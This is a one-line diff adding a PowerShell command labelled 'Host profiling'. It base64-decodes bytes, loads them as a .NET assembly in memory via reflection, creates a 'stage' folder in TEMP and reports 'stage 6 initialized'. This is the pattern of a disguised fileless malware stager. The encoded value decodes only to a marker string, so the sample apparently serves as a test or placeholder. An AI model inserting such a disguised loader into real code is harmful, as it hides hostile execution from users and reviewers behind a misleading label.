@@ -1,0 +1,1 @@
+<# Host profiling #> $ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjp5bHFybWM2YzVv"); [Reflection.Assembly]::Load($ManagedBytes); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; Write-Output "stage 6 initialized"
